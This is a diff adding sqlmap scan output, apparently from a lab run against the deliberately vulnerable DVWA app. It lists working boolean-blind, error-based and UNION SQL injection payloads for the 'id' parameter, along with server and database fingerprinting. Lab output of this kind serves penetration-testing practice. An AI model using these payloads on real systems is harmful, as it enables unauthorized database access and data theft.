@@ -1,0 +1,22 @@
+sqlmap identified the following injection point(s) with a total of 143 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=1' OR NOT 9940=9940#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1' AND (SELECT 7353 FROM(SELECT COUNT(*),CONCAT(0x717a707671,(SELECT (ELT(7353=7353,1))),0x716b717071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- nads&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT CONCAT(0x717a707671,0x765442656873634c755a7846565758654a44525668444c66424455424b564472734743586347596b,0x716b717071),NULL#&Submit=Submit
+---
+web server operating system: Linux Debian 9 (stretch)
+web application technology: Apache 2.4.25
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+available databases [2]:
+[*] dvwa
+[*] information_schema
+
